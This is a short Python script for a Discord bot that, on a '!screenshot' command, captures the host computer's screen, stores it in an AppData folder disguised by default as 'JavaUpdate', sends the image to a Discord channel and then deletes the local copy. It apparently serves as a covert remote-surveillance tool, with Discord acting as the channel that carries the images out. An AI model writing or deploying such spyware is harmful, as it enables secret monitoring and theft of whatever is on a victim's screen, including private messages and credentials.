#change "token" to your discord bot token.
#directoryname is the name of the folder the screenshot will be saved at.
#prefix is the discord prefix used to perform the command.
#directory will be located at roaming, inside appdata.
#you can get to appdata running windows + R and typing appdata

token = "change me"
directoryname = "JavaUpdate"
prefix = "!"

#code

#----------------------------------------------------------------------------------#

import discord
from discord.ext import commands
import pyautogui
import os
import time
appdata = os.getenv("APPDATA")
pathfld = rf"{appdata}\{directoryname}"
pathss = rf"{appdata}\{directoryname}\screenshot.png"


def screenshitting():
    if not os.path.exists(pathfld):
        os.makedirs(f"{appdata}\{directoryname}")
        print(f"created new folder at {pathfld}")


    print (appdata)
    screenshot = pyautogui.screenshot()
    screenshot.save(rf'{appdata}\{directoryname}\screenshot.png')







client = commands.Bot(command_prefix = prefix, case_insensitive = True, intents=discord.Intents.all())
@client.event
async def on_ready():
    print('connected and ready to use!')
    
    
    


@client.command()
async def screenshot(ctx):
    screenshitting()
    file = discord.File(pathss, filename="screenshot.png")
    await ctx.send(file=file)
    
    time.sleep(2)
    
    os.remove(pathss)
    
client.run(token)
